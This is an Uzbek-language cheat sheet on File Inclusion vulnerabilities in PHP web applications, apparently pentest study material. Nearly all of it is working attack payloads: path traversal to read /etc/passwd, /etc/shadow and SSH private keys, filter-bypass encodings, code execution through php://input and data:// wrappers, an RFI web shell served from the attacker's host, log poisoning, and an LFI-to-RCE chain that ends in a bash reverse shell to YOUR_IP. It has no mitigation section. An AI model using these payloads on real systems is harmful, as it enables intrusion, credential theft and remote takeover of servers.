# 📁 File Inclusion (Fayl Kiritish Zaifligi)

> **Maqsad:** Serverda mavjud bo'lgan fayllarni o'qish (LFI) yoki tashqi manbadan skript yuklash (RFI) orqali tizimni buzish.

---

## 📖 Asosiy Tushunchalar

### File Inclusion nima?
Veb-ilova faylarni dinamik yuklaydi: `?page=about` → `about.php` faylini yuklaydi.

Agar bu parametr to'g'ri filtirlanmasa, hujumchi boshqa fayllarni yuklatishi mumkin.

### 2 tur:
| Tur | Inglizcha | Ma'nosi |
|-----|-----------|---------|
| **LFI** | Local File Inclusion | Serverdagi mahalliy fayllarni o'qish |
| **RFI** | Remote File Inclusion | Internet dan tashqi fayl yuklash |

---

## 📂 LFI (Local File Inclusion — Mahalliy Fayl Kiritish)

### Zaif kod misoli (PHP):
```php
<?php
  $file = $_GET['page'];
  include($file);
?>
```

### Oddiy LFI:
```
# Linux tizimidagi muhim fayllar
http://target.com/?page=/etc/passwd
http://target.com/?page=/etc/shadow     (faqat root o'qiy oladi)
http://target.com/?page=/etc/hosts

# Windows tizimida
http://target.com/?page=C:\Windows\System32\drivers\etc\hosts
http://target.com/?page=C:\Windows\win.ini
```

### Path Traversal (Katalog Kesib O'tish) bilan LFI:
```
# Agar ilova /var/www/html/pages/ papkasida qidirsa:
http://target.com/?page=../../../etc/passwd
# /var/www/html/pages/../../../../etc/passwd → /etc/passwd

# Har bir ../ bir katalog yuqoriga chiqadi:
../           → bitta yuqori
../../        → ikkita yuqori
../../../     → uchta yuqori
../../../../  → to'rtta yuqori
```

### Filtrlarni Chetlab O'tish:

```
# 1. Agar "../" filtirlanган bo'lsa:
....//....//....//etc/passwd     # ikki bor yozish
..././..././..././etc/passwd     # aralash

# 2. URL encoding
%2e%2e%2f = ../      # URL encoded
%2e%2e/ = ../
..%2f = ../

# 3. Null byte (eski PHP da ishlaydi)
http://target.com/?page=../../../etc/passwd%00

# 4. Agar ".php" avtomatik qo'shilsa:
http://target.com/?page=../../../etc/passwd%00   # null byte bilan kest
http://target.com/?page=php://filter/convert.base64-encode/resource=../../../etc/passwd
```

---

## 🌐 PHP Wrapper lar (O'rovlar)

PHP ning maxsus protokollari — server fayllarni boshqacha o'qishga imkon beradi.

```bash
# Faylni Base64 da o'qish (kodni ko'rish uchun)
http://target.com/?page=php://filter/convert.base64-encode/resource=index.php
# Natijani decode qiling:
echo "XXXXXXXX" | base64 -d

# php://input — POST orqali PHP kodni ishlatish
curl -X POST "http://target.com/?page=php://input" \
  --data "<?php system('id'); ?>"

# data:// — to'g'ridan-to'g'ri kod
http://target.com/?page=data://text/plain,<?php system('id')?>

# data:// base64 bilan
echo "<?php system('id'); ?>" | base64
# Natija: PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

## 🖥️ RFI (Remote File Inclusion — Masofaviy Fayl Kiritish)

PHP ning `allow_url_include` sozlamasi yoqilgan bo'lsa ishlaydi.

```bash
# Avval zararli PHP fayli yarating (o'z kompyuteringizda):
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# HTTP server boshlang:
python3 -m http.server 8000

# RFI hujumi:
http://target.com/?page=http://YOUR_IP:8000/shell.php
http://target.com/?page=http://YOUR_IP:8000/shell.php&cmd=id
http://target.com/?page=http://YOUR_IP:8000/shell.php&cmd=whoami
```

---

## 🐚 Log Poisoning (Jurnal Zaharlash) → RCE

Agar log faylini o'qiy olsak, unga PHP kodi yozib, keyin o'sha faylni yuklaymiz.

```bash
# 1-qadam: Apache log faylini o'qi
http://target.com/?page=/var/log/apache2/access.log

# 2-qadam: User-Agent ga PHP kodi yoz
curl -s "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 3-qadam: Log faylini qayta yuki va cmd parametrini qo'sh
http://target.com/?page=/var/log/apache2/access.log&cmd=id

# Boshqa log joylari:
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/nginx/access.log
/proc/self/fd/0    (stdin)
/var/log/auth.log  (SSH urinishlari)
```

---

## 🎯 Amaliy Misol: LFI → RCE

```bash
# 1-qadam: LFI mavjudligini tekshirish
curl "http://target.com/?page=../../../etc/passwd"

# /etc/passwd topildi!
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

# 2-qadam: PHP wrapper bilan manba kodini o'qish
curl "http://target.com/?page=php://filter/convert.base64-encode/resource=index" | \
  grep -o '[A-Za-z0-9+/=]\{20,\}' | base64 -d

# 3-qadam: Log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/?page=/var/log/apache2/access.log&cmd=id"

# 4-qadam: Reverse shell (agar RCE ishlasa)
# O'z kompyuteringizda:
nc -lvnp 4444

# LFI/RCE orqali:
# cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
curl "http://target.com/?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
```

---

## 📋 Muhim Linux Fayllari (LFI uchun)

```
/etc/passwd          → Foydalanuvchilar ro'yxati
/etc/shadow          → Parol hashlari (root kerak)
/etc/hosts           → DNS sozlamalari
/etc/os-release      → OS versiyasi
/proc/version        → Kernel versiyasi
/proc/self/environ   → Muhit o'zgaruvchilari
/var/www/html/index.php → Veb fayl (manba kodi)
~/.ssh/id_rsa        → SSH private key
~/.bash_history      → Bash tarixi
/var/log/apache2/access.log → Apache log
/var/log/nginx/access.log   → Nginx log
```

---

## 💡 Eslab Qolish Uchun

| Zaiflik | Payload | Natija |
|---------|---------|--------|
| LFI | `../../../etc/passwd` | Fayl o'qish |
| PHP Filter | `php://filter/...resource=index` | Manba kodi |
| PHP Input | `php://input` + POST | Kod ishlatish |
| Log Poison | User-Agent → PHP kod → log yuklash | RCE |
| RFI | `http://attacker/shell.php` | Masofaviy kod |

- **LFI** = Serverdagi fayl | **RFI** = Internetdan fayl
- `../` = katalog yuqoriga | Ko'p `../../../` qo'shib sinab ko'r
- Filtr bo'lsa: `....//`, URL encoding, null byte
- Log poisoning: `../../../var/log/apache2/access.log`
